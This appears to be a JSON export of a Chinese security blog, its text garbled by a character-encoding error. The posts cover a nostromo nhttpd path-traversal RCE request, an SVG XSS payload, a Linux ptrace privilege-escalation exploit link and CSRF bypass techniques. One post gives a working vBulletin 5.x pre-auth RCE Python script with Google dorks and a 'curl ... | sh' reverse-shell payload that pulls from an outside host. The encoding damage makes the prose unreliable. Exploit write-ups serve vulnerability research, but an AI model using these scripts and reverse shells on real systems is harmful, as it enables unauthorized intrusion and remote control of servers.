è·¯å¾„éå†æ¼æ´","slug":"CVE-2019-16278","date":"2019-10-17T07:30:08.000Z","updated":"2019-10-17T07:32:00.814Z","comments":true,"path":"2019/10/17/CVE-2019-16278/","link":"","permalink":"http://www.vkxss.top/2019/10/17/CVE-2019-16278/","excerpt":"","text":"0X00 ç®€ä»‹ 0X01 CVEç¼–å· 0X02 æ¼æ´å¨èƒç­‰çº§ 0X03 å½±å“èŒƒå›´ 0X04 æ¼æ´æè¿° 0X05 æ¼æ´POC 0X06 æ¼æ´å¤ç° 0X07 ä¿®å¤å»ºè®® 0X08 Reference 0X00 ç®€ä»‹ nostromo nhttpdæ˜¯ä¸€æ¬¾å¼€æºçš„WebæœåŠ¡å™¨ã€‚ nostromo nhttpd 1.9.6åŠä¹‹å‰ç‰ˆæœ¬ä¸­çš„â€˜http_verifyâ€™å‡½æ•°å­˜åœ¨è·¯å¾„éå†æ¼æ´ã€‚è¯¥æ¼æ´æºäºç½‘ç»œç³»ç»Ÿæˆ–äº§å“æœªèƒ½æ­£ç¡®åœ°è¿‡æ»¤èµ„æºæˆ–æ–‡ä»¶è·¯å¾„ä¸­çš„ç‰¹æ®Šå…ƒç´ ã€‚æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´è®¿é—®å—é™ç›®å½•ä¹‹å¤–çš„ä½ç½®ã€‚ 0X01 CVEç¼–å· CVE-2019-16278 0X02 æ¼æ´å¨èƒç­‰çº§ é«˜å± 0X03 å½±å“èŒƒå›´ nostromo nhttpd &lt;= 1.9.6 0X04 æ¼æ´æè¿° nostromo nhttpd 1.9.6åŠä¹‹å‰ç‰ˆæœ¬ä¸­çš„â€˜http_verifyâ€™å‡½æ•°å­˜åœ¨è·¯å¾„éå†æ¼æ´ã€‚è¯¥æ¼æ´æºäºç½‘ç»œç³»ç»Ÿæˆ–äº§å“æœªèƒ½æ­£ç¡®åœ°è¿‡æ»¤èµ„æºæˆ–æ–‡ä»¶è·¯å¾„ä¸­çš„ç‰¹æ®Šå…ƒç´ ã€‚æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´è®¿é—®å—é™ç›®å½•ä¹‹å¤–çš„ä½ç½®ã€‚ 0X05 æ¼æ´POC CVE-2019-16278.sh 12345678POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0Connection: closeUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0Content-Length: 25 echo echo ifconfig 2&gt;&amp;1 0X06 æ¼æ´å¤ç° è®°å½•ä¸€ä¸‹ï¼Œè¯·å‚è€ƒï¼š https://github.com/vkbiu/CVE/tree/master/CVE-2019-16278 0X07 ä¿®å¤å»ºè®® ä¸Šwafæˆ–é˜²ç«å¢™é…ç½®è§„åˆ™æ‹¦æˆª,ç­‰å¾…å®˜æ–¹ä¿®å¤æ‰“è¡¥ä¸ã€‚ 0X08 Reference å‚è€ƒé“¾æ¥ï¼š http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201910-807 https://git.sp0re.sh/sp0re/Nhttpd-exploits","categories":[{"name":"CVE-2019","slug":"CVE-2019","permalink":"http://www.vkxss.top/categories/CVE-2019/"}],"tags":[{"name":"CVE-2019-16278","slug":"CVE-2019-16278","permalink":"http://www.vkxss.top/tags/CVE-2019-16278/"}]},{"title":"æ¥å£å¿«é€Ÿæµ‹è¯•å°æŠ€å·§(Python)","slug":"Python-æ¥å£å¿«é€Ÿæµ‹è¯•å°æŠ€å·§(Python)","date":"2019-10-11T07:30:08.000Z","updated":"2019-11-15T09:10:30.260Z","comments":true,"path":"2019/10/11/Python-æ¥å£å¿«é€Ÿæµ‹è¯•å°æŠ€å·§(Python)/","link":"","permalink":"http://www.vkxss.top/2019/10/11/Python-æ¥å£å¿«é€Ÿæµ‹è¯•å°æŠ€å·§(Python)/","excerpt":"","text":"æ¥å£å¿«é€Ÿæµ‹è¯•å°æŠ€å·§(Python) ç»ˆäºæ‰¾åˆ°è§£å†³æˆ‘æ¯æ¬¡å†™è¯·æ±‚å¤´ä¸åœå¤åˆ¶ç²˜è´´ï¼Œæ”¹æ ¼å¼ã€‚ä¹‹åæˆ‘ä»¬å¯ä»¥è¿™æ ·ï¼Œæé«˜äº†æµ‹è¯•çš„æ•ˆç‡ï¼Œå…å¾—é‡å¤é€ è½®å­ï¼Œä¸åªæ˜¯æ”¯æŒpythonï¼Œè€Œä¸”è¿˜æ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€è½¬æ¢ã€‚ğŸ‚ğŸº ç½‘ç«™ï¼šhttps://curl.trillworks.com","categories":[{"name":"Python","slug":"Python","permalink":"http://www.vkxss.top/categories/Python/"}],"tags":[{"name":"WEBæ¸—é€æµ‹è¯•","slug":"WEBæ¸—é€æµ‹è¯•","permalink":"http://www.vkxss.top/tags/WEBæ¸—é€æµ‹è¯•/"}]},{"title":"SVG-XSS","slug":"æ¸—é€æµ‹è¯•-SVG-XSS","date":"2019-10-11T07:30:08.000Z","updated":"2019-10-11T10:38:58.307Z","comments":true,"path":"2019/10/11/æ¸—é€æµ‹è¯•-SVG-XSS/","link":"","permalink":"http://www.vkxss.top/2019/10/11/æ¸—é€æµ‹è¯•-SVG-XSS/","excerpt":"","text":"SVG-XSS ä»‹ç» SVGæ–‡ä»¶ Xss Payload SVG-XSSä»‹ç» è·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰æ˜¯ä¸€ä¸ªéå¸¸å¸¸è§çš„æ¼æ´ï¼Œæ¶‰åŠåœ¨ç½‘é¡µä¸­æ³¨å…¥javascriptä»£ç ã€‚ä»çªƒå–ç”¨æˆ·Cookieåˆ°é€šè¿‡CORSç»•è¿‡SOPï¼Œæ­¤æ¼æ´å¯ç”¨äºæ‰§è¡Œå„ç§æ“ä½œã€‚æœ‰è®¸å¤šæ–¹æ³•å¯ä»¥å®šä½XSSæ¼æ´ï¼Œé€šå¸¸ä¼šå¿½ç•¥SVGæ–‡ä»¶ã€‚ SVGæ–‡ä»¶ å¯ç¼©æ”¾çŸ¢é‡å›¾å½¢ï¼ˆSVGï¼‰æ˜¯ç”¨äºäºŒç»´å›¾å½¢çš„åŸºäºXMLçš„çŸ¢é‡å›¾åƒæ ¼å¼ï¼Œå¹¶æ”¯æŒäº¤äº’æ€§å’ŒåŠ¨ç”»ã€‚ ä»¥ä¸‹ä»£ç æ˜¯åŸºæœ¬SVGæ–‡ä»¶çš„ç¤ºä¾‹ï¼š 123&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt; &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;&lt;/svg&gt; SVGæ–‡ä»¶è¿˜æ”¯æŒåµŒå…¥å¼javascriptä»£ç ã€‚ä¾‹å¦‚ï¼Œå¼€å‘äººå‘˜å¯èƒ½åœ¨svgå›¾åƒä¸­ä½¿ç”¨javascriptï¼Œä»¥ä¾¿ä»–ä»¬å¯ä»¥å®æ—¶è¿›è¡Œæ“ä½œã€‚è¿™å¯ä»¥ç”¨äºåŠ¨ç”»å’Œå…¶ä»–ä»»åŠ¡ã€‚ è¦æ³¨æ„çš„å¦ä¸€ä»¶äº‹æ˜¯ï¼ŒSVGæ–‡ä»¶å¯ä»¥è§†ä¸ºHTMLä¸­çš„å›¾åƒã€‚è¿™æ„å‘³ç€æ‚¨å¯ä»¥å°†SVGæ–‡ä»¶æ”¾ç½®åœ¨å›¾åƒæ ‡ç­¾ä¸­ï¼Œå¹¶ä¸”å¯ä»¥å®Œç¾å‘ˆç°ï¼š 1&lt;img src=&quot;rectangle.svg&quot; alt=&quot;Rectangle&quot; height=&quot;42&quot; width=&quot;42&quot;&gt; Xss Payload å¦‚æœç½‘ç«™ä½¿ç”¨XSSæœ‰æ•ˆè´Ÿè½½åŠ è½½SVGæ–‡ä»¶ï¼Œåˆ™å°†æ‰§è¡Œè¯¥æ–‡ä»¶ã€‚å¼€å‘äººå‘˜å’Œæ”»å‡»è€…éƒ½ç»å¸¸å¿½è§†è¿™ä¸€ç‚¹ã€‚ä»¥ä¸‹æ˜¯å¸¦æœ‰è­¦æŠ¥XSSæœ‰æ•ˆè´Ÿè½½çš„SVGæ–‡ä»¶ç¤ºä¾‹ï¼š 123456789&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt; &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt; &lt;script type=&quot;text/javascript&quot;&gt; alert(&quot;SVG XSS&quot;); &lt;/script&gt;&lt;/svg&gt; ä¸Šä¼ æ—¶ï¼Œæ³¨æ„å†…å®¹ç±»å‹è®¾ç½®ä¸ºï¼šContent-Type: image/svg+xml ä¸Šä¼ å›¾åƒåï¼Œæ‚¨åªéœ€æ‰¾å‡ºå›¾åƒä¸Šè½½åˆ°çš„è·¯å¾„å³å¯ã€‚å¦‚æœæ‚¨ä½¿ç”¨çš„æ˜¯Google chromeï¼Œåˆ™å¯ä»¥é€šè¿‡å³é”®å•å‡»å›¾ç‰‡å¹¶é€‰æ‹©â€œå¤åˆ¶å›¾ç‰‡åœ°å€â€æ¥è½»æ¾å®Œæˆæ­¤æ“ä½œã€‚å¦‚æœåœ¨æŸ¥çœ‹å›¾åƒæ—¶ä¸€åˆ‡æ­£å¸¸ï¼Œåˆ™å°†æ‰§è¡Œæœ‰æ•ˆè´Ÿè½½ã€‚æ‚¨åªæ˜¯é€šè¿‡SVGæ–‡ä»¶å­˜å‚¨äº†XSSã€‚","categories":[{"name":"WEBå®‰å…¨","slug":"WEBå®‰å…¨","permalink":"http://www.vkxss.top/categories/WEBå®‰å…¨/"}],"tags":[{"name":"WEBæ¸—é€æµ‹è¯•","slug":"WEBæ¸—é€æµ‹è¯•","permalink":"http://www.vkxss.top/tags/WEBæ¸—é€æµ‹è¯•/"}]},{"title":"CVE-2019-13272-Linuxæœ¬åœ°ææƒæ¼æ´","slug":"CVE-2019-13272","date":"2019-10-08T07:30:08.000Z","updated":"2019-10-09T08:00:57.618Z","comments":true,"path":"2019/10/08/CVE-2019-13272/","link":"","permalink":"http://www.vkxss.top/2019/10/08/CVE-2019-13272/","excerpt":"","text":"æ¼æ´æ¦‚è¿°ï¼š å½±å“èŒƒå›´ å¤ç°ç¯å¢ƒ æ¼æ´å¤ç° æ¼æ´æ¦‚è¿°ï¼š å½“è°ƒç”¨PTRACE_TRACEMEæ—¶ï¼Œptrace_linkå‡½æ•°å°†è·å¾—å¯¹çˆ¶è¿›ç¨‹å‡­æ®çš„RCUå¼•ç”¨ï¼Œç„¶åå°†è¯¥æŒ‡é’ˆæŒ‡å‘get_credå‡½æ•°ã€‚ä½†æ˜¯ï¼Œå¯¹è±¡struct credçš„ç”Ÿå­˜å‘¨æœŸè§„åˆ™ä¸å…è®¸æ— æ¡ä»¶åœ°å°†RCUå¼•ç”¨è½¬æ¢ä¸ºç¨³å®šå¼•ç”¨ã€‚ PTRACE_TRACEMEè·å–çˆ¶è¿›ç¨‹çš„å‡­è¯ï¼Œä½¿å…¶èƒ½å¤Ÿåƒçˆ¶è¿›ç¨‹ä¸€æ ·æ‰§è¡Œçˆ¶è¿›ç¨‹èƒ½å¤Ÿæ‰§è¡Œçš„å„ç§æ“ä½œã€‚å¦‚æœæ¶æ„ä½æƒé™å­è¿›ç¨‹ä½¿ç”¨PTRACE_TRACEMEå¹¶ä¸”è¯¥å­è¿›ç¨‹çš„çˆ¶è¿›ç¨‹å…·æœ‰é«˜æƒé™ï¼Œè¯¥å­è¿›ç¨‹å¯è·å–å…¶çˆ¶è¿›ç¨‹çš„æ§åˆ¶æƒå¹¶ä¸”ä½¿ç”¨å…¶çˆ¶è¿›ç¨‹çš„æƒé™è°ƒç”¨execveå‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„é«˜æƒé™è¿›ç¨‹ã€‚æ”»å‡»è€…æœ€ç»ˆæ§åˆ¶å…·æœ‰é«˜æƒé™çš„ä¸¤ä¸ªè¿›ç¨‹ptraceå…³ç³»ï¼Œå¯ä»¥è¢«ç”¨æ¥ptraceï¼ŒsuidäºŒè¿›åˆ¶æ–‡ä»¶å¹¶è·å¾—rootæƒé™ã€‚ å½±å“èŒƒå›´ ç›®å‰å—å½±å“çš„Linuxå†…æ ¸ç‰ˆæœ¬ï¼š Linux Kernel &lt; 5.1.17 å¤ç°ç¯å¢ƒ exploitä¸‹è½½åœ°å€ï¼š https://github.com/vkbiu/CVE/tree/master/CVE-2019-13272 Ubuntu 4.13.0-38-generic Kaliæœªå¤ç°æˆåŠŸï¼Œæ™®é€šç”¨æˆ·æ‰§è¡Œgccï¼Œæç¤ºæƒé™ä¸å¤Ÿ æ¼æ´å¤ç° åˆ©ç”¨æ•ˆæœå¦‚ä¸‹å›¾:","categories":[{"name":"CVE-2019","slug":"CVE-2019","permalink":"http://www.vkxss.top/categories/CVE-2019/"}],"tags":[{"name":"Linuxæœ¬åœ°æå–","slug":"Linuxæœ¬åœ°æå–","permalink":"http://www.vkxss.top/tags/Linuxæœ¬åœ°æå–/"}]},{"title":"vBulletin 5.x å‰å°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°","slug":"CVE-2019-16759","date":"2019-09-25T07:30:08.000Z","updated":"2019-09-25T16:45:55.068Z","comments":true,"path":"2019/09/25/CVE-2019-16759/","link":"","permalink":"http://www.vkxss.top/2019/09/25/CVE-2019-16759/","excerpt":"","text":"0X00 ç®€ä»‹ 0X01 CVEç¼–å· 0X02 æ¼æ´å¨èƒç­‰çº§ 0X03 å½±å“èŒƒå›´ 0X04 æ¼æ´æè¿° 0X05 æ¼æ´POC 0X06 æ¼æ´å¤ç° 0X07 ä¿®å¤å»ºè®® 0X08 Reference 0X00 ç®€ä»‹ vBulletin æ˜¯ä¸€ä¸ªå•†ç”¨çš„è®ºå›ç¨‹åºï¼Œåœ¨å…¨çƒæ‹¥æœ‰æ•°ä¸‡ç”¨æˆ·ä¸”å¢é•¿é€Ÿåº¦å¾ˆå¿«ã€‚è¯¥è®ºå›é‡‡ç”¨PHP Webè¯­è¨€åŠMySQLæ•°æ®åº“çš„æ–¹å¼è¿›è¡Œæ¶æ„ã€‚ã€Šè´¢å¯Œã€‹ 500å¼ºå’ŒAlexaæ’åå‰100ä¸‡çš„å…¬å¸ç½‘ç«™å¤§éƒ¨åˆ†éƒ½åœ¨ä½¿ç”¨çš„ä¸€æ¬¾äº’è”ç½‘è®ºå›ç¨‹åºã€‚ 0X01 CVEç¼–å· CVE-2019-16759 ç›¸å…³ä¿¡æ¯é“¾æ¥ï¼šhttps://seclists.org/fulldisclosure/2019/Sep/31 0X02 æ¼æ´å¨èƒç­‰çº§ é«˜å± 0X03 å½±å“èŒƒå›´ CVE-2019-16759æ¼æ´å½±å“ï¼švBulletin 5.0.0 åˆ°æœ€æ–° 5.5.4ç‰ˆæœ¬ 0X04 æ¼æ´æè¿° æ¼æ´é€šè¿‡è¯·æ±‚ajax/render/widget_phpè¿›è¡Œæ¨¡æ¿æ³¨å…¥è§¦å‘ä»£ç æ‰§è¡Œã€‚ 0X05 æ¼æ´POC12345678910111213141516171819202122232425262728293031#!/usr/bin/python## vBulletin 5.x 0day pre-auth RCE exploit# # This should work on all versions from 5.0.0 till 5.5.4## Google Dorks:# - site:*.vbulletin.net# - &quot;Powered by vBulletin Version 5.5.4&quot;import requestsimport sysif len(sys.argv) != 2: sys.exit(&quot;Usage: %s &lt;URL to vBulletin&gt;&quot; % sys.argv[0])params = &#123;&quot;routestring&quot;:&quot;ajax/render/widget_php&quot;&#125;while True: try: cmd = raw_input(&quot;vBulletin$ &quot;) params[&quot;widgetConfig[code]&quot;] = &quot;echo shell_exec(&apos;&quot;+cmd+&quot;&apos;); exit;&quot; r = requests.post(url = sys.argv[1], data = params) if r.status_code == 200: print r.text else: sys.exit(&quot;Exploit failed! :(&quot;) except KeyboardInterrupt: sys.exit(&quot;\\nClosing shell...&quot;) except Exception, e: sys.exit(str(e)) 0X06 æ¼æ´å¤ç° æ¼æ´åœ°å€ï¼š è®¿é—®æ¼æ´URLï¼Œä¿®æ”¹è¯·æ±‚æ–¹å¼ä¸ºPOSTï¼š ç„¶ååœ¨postå‚æ•°ä¸­å¯è¾“å…¥ä»¥ä¸‹ä»»æ„payloadéªŒè¯ï¼š payload1ï¼šwidgetConfig[code] = echo shell_exec(â€˜idâ€™); payload2ï¼šwidgetConfig[code] = echo shell_exec(â€˜whoamiâ€™); payload3ï¼šwidgetConfig[code] = echo shell_exec(â€˜uname-aâ€™); payload4ï¼šwidgetConfig[code] = echo shell_exec(â€˜curl https://shell.now.sh/yourip:1337 | shâ€™); æ³¨æ„ä½¿ç”¨payload4åå¼¹shellï¼Œå‚è€ƒå¦‚ä¸‹ï¼š Reverse Shell as a Service https://github.com/lukechilds/reverse-shell åœ¨ä½ çš„æœºå™¨ï¼šnc -l 1337 åœ¨ç›®æ ‡æœºå™¨ä¸Šï¼šcurl https://shell.now.sh/yourip:1337 | sh åå¼¹Shellä¼šè¯ 0X07 ä¿®å¤å»ºè®® ä¸Šwafæˆ–é˜²ç«å¢™é…ç½®è§„åˆ™æ‹¦æˆª,ç­‰å¾…å®˜æ–¹ä¿®å¤æ‰“è¡¥ä¸ã€‚ 0X08 Reference å‚è€ƒé“¾æ¥ï¼šhttps://www.youtube.com/watch?v=ymLRqsbCuVY","categories":[{"name":"CVE-2019","slug":"CVE-2019","permalink":"http://www.vkxss.top/categories/CVE-2019/"}],"tags":[{"name":"CVE-2019-16759","slug":"CVE-2019-16759","permalink":"http://www.vkxss.top/tags/CVE-2019-16759/"}]},{"title":"ç»•è¿‡CSRFé˜²å¾¡æ€»ç»“","slug":"æ¸—é€æµ‹è¯•-ç»•è¿‡CSRFé˜²å¾¡æ€»ç»“","date":"2019-09-19T07:30:08.000Z","updated":"2020-01-09T02:15:27.152Z","comments":true,"path":"2019/09/19/æ¸—é€æµ‹è¯•-ç»•è¿‡CSRFé˜²å¾¡æ€»ç»“/","link":"","permalink":"http://www.vkxss.top/2019/09/19/æ¸—é€æµ‹è¯•-ç»•è¿‡CSRFé˜²å¾¡æ€»ç»“/","excerpt":"","text":"ä¸€ã€ å…ˆäº†è§£ä¸‹CSRF_TOKEN 1. ä»€ä¹ˆæ˜¯CSRF_TOKEN 2. ä¸ºä»€ä¹ˆCSRF-Tokenå¯ä»¥å†™åœ¨COOKIEé‡Œ 3. å¸¸è§csrf_tokenä½¿ç”¨æ–¹å¼æœ‰ä¸¤ç§ï¼š 3.1 Synchronizer token pattern(STP) 3.2 Cookie-to-header token äºŒã€ç»•è¿‡CSRFé˜²å¾¡æ€»ç»“ 2.1 æ‰€æœ‰çš„CSRF 2.1.1 ç‚¹å‡»åŠ«æŒ 2.1.2 æ›´æ”¹è¯·æ±‚æ–¹æ³• ä¸‰ ã€CSRF tokençš„é˜²å¾¡æªæ–½ 3.1 åˆ é™¤tokenå‚æ•°æˆ–å‘é€ç©ºtoken 3.2 ä»¤ç‰Œå…±äº« 3.3 Sessionå›ºå®š 3.4 çªƒå–token 3.5 JsonpåŠ«æŒè·å–csrf_token 3.6 è§£ç CSRFä»¤ç‰Œ 3.6 ä¿®æ”¹è¯·æ±‚æ–¹æ³• å››ã€ Refererå­—æ®µçš„CSRFé˜²å¾¡ 4.1 Refererå€¼ä¸ºç©ºæˆ–ç§»é™¤refererå­—æ®µ 4.2 è‡ªå»ºæœåŠ¡å™¨è·¯å¾„å¸¦refererå­—æ®µå 4.3 åˆ©ç”¨URLè·³è½¬ 4.3 ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼ ä¸€ã€ å…ˆäº†è§£ä¸‹CSRF_TOKEN1. ä»€ä¹ˆæ˜¯CSRF_TOKEN å°±æ˜¯é˜²æ­¢è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰çš„ 2. ä¸ºä»€ä¹ˆCSRF-Tokenå¯ä»¥å†™åœ¨COOKIEé‡Œ å°†csrfä»¤ç‰Œå†™å…¥Cookieï¼Œæ˜¯å› ä¸ºï¼šæœåŠ¡å™¨è¿›è¡Œcsrfé˜²å¾¡æ ¡éªŒçš„æ—¶å€™ï¼Œæ˜¯æ‹¿ç”¨æˆ·httpè¯·æ±‚ä½“ä¸­çš„tokenå‚æ•°å€¼å’Œcookieä¸­çš„csrftokenå€¼è¿›è¡Œæ¯”å¯¹ã€‚å¦‚æœå€¼ä¸€æ ·äº†ï¼Œæ“ä½œæ‰è¢«å…è®¸æ‰§è¡Œã€‚ å› ä¸ºåŒæºç­–ç•¥çš„é™åˆ¶ï¼Œå½“æ­£å¸¸ç”¨æˆ·é€šè¿‡è´¦å·å¯†ç ç­‰æ–¹å¼ç™»é™†ç½‘ç«™Aåï¼Œåœ¨ä¸æ³¨é”€è´¦å·æˆ–å½“å‰COOKIEå¤±æ•ˆä¹‹å‰ï¼Œå†æ¬¡è®¿é—®ç½‘ç«™Aæ—¶ï¼ˆåè®®ã€IPã€ç«¯å£å·ç›¸åŒåˆ™å±äºåŒæºï¼‰æµè§ˆå™¨ä¼šè‡ªåŠ¨åœ¨HTTPè¯·æ±‚åŒ…ä¸­å¸¦ä¸Šè¯¥ç½‘ç«™ç”¨æˆ·ç™»é™†åçš„COOKIEä¿¡æ¯ã€‚è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆåŒæºç­–ç•¥æ— æ³•é˜²å¾¡csrfçš„åŸå› ã€‚ ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯¹CSRFçš„ç†è§£åº”ä¸ºï¼šæ”»å‡»è€…å€Ÿç”¨ç”¨æˆ·COOKIEæ‰§è¡Œéç”¨æˆ·æœ¬æ„çš„æ“ä½œã€‚ åœ¨æ­¤æ”»å‡»è¿‡ç¨‹ä¸­ç”¨æˆ·COOKIEå¯¹äºæ”»å‡»è€…æ¥è¯´æ˜¯ä¸å¯è§çš„æ˜¯æœªçŸ¥çš„ã€ä¸å¯è§çš„ï¼Œæ”»å‡»è€…èƒ½åšåˆ°ä»…ä»…æ˜¯å€Ÿç”¨COOKIEï¼Œè€ŒCOOKIEé‡Œé¢å…·ä½“å†™äº†ä»€ä¹ˆï¼Œæ”»å‡»è€…æ˜¯ä¸çŸ¥é“çš„ã€‚åˆå› ä¸ºCOOKIEé‡Œçš„ä¿¡æ¯å¯¹äºæ”»å‡»è€…æ¥è¯´æ˜¯ä¸å¯é¢„çŸ¥çš„ï¼Œæ— æ³•ä¼ªé€ çš„ï¼Œæ‰€ä»¥å°†CSRF-TOKENå†™åœ¨COOKIEä¸­ç¬¦åˆå°±CSRFé˜²å¾¡æ€æƒ³ä¸­çš„ä¸å¯é¢„çŸ¥åŸåˆ™ã€‚ 3. å¸¸è§csrf_tokenä½¿ç”¨æ–¹å¼æœ‰ä¸¤ç§ï¼š3.1 Synchronizer token pattern(STP) å¯¹äºæ¯ä¸ªrequestï¼Œåœ¨æœåŠ¡å™¨ç«¯ç”Ÿæˆä¸€ä¸ªæ–°çš„csrf_tokenï¼Œå¹¶å°†å…¶è¿”å›åœ¨é¡µé¢çš„è¡¨å•ä¸­ã€‚åœ¨æœåŠ¡å™¨ç«¯æ¯æ¬¡æ¥æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œéƒ½ä¼šéªŒè¯è¡¨å•ä¸­æ˜¯å¦åŒ…å«æ­£ç¡®çš„csrf_tokenã€‚ç”±äºç¬¬ä¸‰æ–¹ç½‘ç«™æ— æ³•å¾—çŸ¥æ­£ç¡®çš„csrf_tokenï¼Œæ‰€ä»¥æ— æ³•è¿›è¡Œcsrfæ”»å‡»ã€‚ 1234567get_token = get_random_token() return &#123; &lt;form&gt; &lt;input name=field1&gt;&lt;/input&gt; &lt;input type=&quot;hidden&quot; name=&quot;csrfmiddlewaretoken&quot; value=#&#123;get_token()&#125; /&gt; &lt;/form&gt;&#125; è¿™ä¸ªæ–¹æ³•çš„å¥½å¤„æ˜¯å®¢æˆ·ç«¯ä¸éœ€è¦æ”¯æŒjavascriptï¼Œå› æ­¤é€šç”¨äºæ‰€æœ‰çš„ç½‘ç«™ã€‚åå¤„æ˜¯ç”±äºæœåŠ¡å™¨ç«¯å¯¹äºæ¯ä¸ªè¯·æ±‚éƒ½ä¼šæ›´æ¢csrf_tokenï¼Œå› æ­¤ä»–éœ€è¦ä¿è¯ç”¨æˆ·æäº¤çš„è¡¨å•æ˜¯ç”¨æˆ·æœ€è¿‘ä¸€æ¬¡è¯·æ±‚çš„è¡¨å•ã€‚å¦‚æœç”¨æˆ·é€šè¿‡å¤šä¸ªtabåŒæ—¶æµè§ˆè¯¥ç½‘ç«™ï¼Œé‚£ä¹ˆå¾€å¾€ä¼šå¯¼è‡´ç”¨æˆ·æäº¤çš„è¡¨å•ä¸æ˜¯æœ€æ–°çš„é‚£ä¸€ä¸ªã€‚ 3.2 Cookie-to-header token ç¬¬äºŒä¸ªæ–¹æ³•æ˜¯ä¸ºæ¯ä¸ªsessionç”Ÿæˆä¸€ä¸ªcsrf_tokenï¼Œéšåå°†csrf_tokenä¿å­˜åˆ°cookieä¸­ï¼Œä¹‹åé€šè¿‡javascriptåœ¨æ¯æ¬¡è¯·æ±‚æ—¶å°†csrf_tokenè®¾ç½®åˆ°http headerä¸­çš„X-Csrf-Tokenå±æ€§ä¸­ã€‚å†åœ¨æœåŠ¡å™¨ç«¯æ¯”è¾ƒCookieçš„csrf_tokenä¸headerä¸­çš„tokenæ˜¯å¦ä¸€è‡´ã€‚ 12345//å½“ç”¨æˆ·ç™»å½•æ—¶è®¾ç½®CookieSet-Cookie: Csrf-token=i8XNjC4b8KVok4uw5RftR38Wgp2BFwql; expires=Thu, 23-Jul-2015 10:25:33 GMT; Max-Age=31449600; Path=///å½“ç”¨æˆ·å‘é€è¯·æ±‚æ—¶è®¾ç½®Http Headerä¸­çš„X-Csrf-TokenX-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql äºŒã€ç»•è¿‡CSRFé˜²å¾¡æ€»ç»“ æ³¨ï¼šåŸæ–‡é“¾æ¥ï¼šhttps://medium.com/swlh/bypassing-csrf-protection-c9b217175eeï¼ˆéœ€è¦ç§‘å­¦ä¸Šç½‘ï¼‰ CSRFæ¼æ´å¾ˆå®¹æ˜“å°±å¯ä»¥è¢«å‘ç°å¹¶åˆ©ç”¨ã€‚ä¸€çœ¼çœ‹å»å¾ˆå¤šç«™ç‚¹å¥½åƒåœ¨è¿™æ–¹é¢éƒ½åšå¾—ä¸é”™ï¼šå½“ä½ æ£€æŸ¥é’ˆå¯¹æ•æ„Ÿæ“ä½œçš„è¯·æ±‚æ—¶ï¼Œä»–ä»¬å¾€å¾€ä¼šå®æ–½CSRFä¿æŠ¤ã€‚æœ‰æ—¶å€™å¯èƒ½æ˜¯ä¸€ä¸ªåœ¨è¯·æ±‚ä¸»ä½“ä¸­çš„CSRF tokenï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯ä¸€ä¸ªrefererå­—æ®µæ£€æµ‹ï¼Œæˆ–è€…æœ‰æ—¶æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„HTTPå¤´å­—æ®µæˆ–è€…cookieå­—æ®µã€‚ ä½†æ˜¯CSRFçš„é˜²å¾¡ä¸ä»£è¡¨å®ƒå°±ä¸å¯ä»¥è¢«ç»•è¿‡ã€‚ä»Šå¤©æˆ‘ä»¬è®¨è®ºä¸€äº›æˆ‘å¦‚ä½•ç»•è¿‡CSRFé˜²å¾¡æªæ–½çš„æŠ€æœ¯ã€‚ 2.1 æ‰€æœ‰çš„CSRF ä¸ç®¡å“ªç§CSRFé˜²å¾¡æªæ–½éƒ¨ç½²ï¼Œä½ éƒ½å¯ä»¥å…ˆå°è¯•å¦‚ä¸‹ä¸¤ä»¶äº‹ï¼šç‚¹å‡»åŠ«æŒå’Œæ›´æ”¹è¯·æ±‚æ–¹æ³•ã€‚ 2.1.1 ç‚¹å‡»åŠ«æŒ åœ¨åŒä¸€ä¸ªåŠŸèƒ½ç«¯ç‚¹åˆ©ç”¨ç‚¹å‡»åŠ«æŒä¼šç»•è¿‡æ‰€æœ‰CSRFé˜²å¾¡ã€‚å› ä¸ºä»æŠ€æœ¯ä¸Šè®²ï¼Œè¯·æ±‚ç¡®å®æ¥è‡ªåˆæ³•ç«™ç‚¹ï¼Œå¦‚æœæ˜“å—æ”»å‡»çš„ç«¯ç‚¹æ‰€åœ¨é¡µé¢å®¹æ˜“é­å—ç‚¹å‡»åŠ«æŒæ”»å‡»ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„CSRFä¿æŠ¤å°†å˜å¾—æ²¡æœ‰æ•ˆæœï¼Œæ”»å‡»è€…å¯ä»¥ä»»æ„æ‰§è¡ŒCSRFæ”»å‡»ã€‚ 2.1.2 æ›´æ”¹è¯·æ±‚æ–¹æ³• å¦å¤–å€¼å¾—ä¸€è¯•çš„æ–¹æ³•å°±æ˜¯æ›´æ”¹è¯·æ±‚çš„æ–¹æ³•ã€‚å¦‚æœè¦ä¼ªé€ 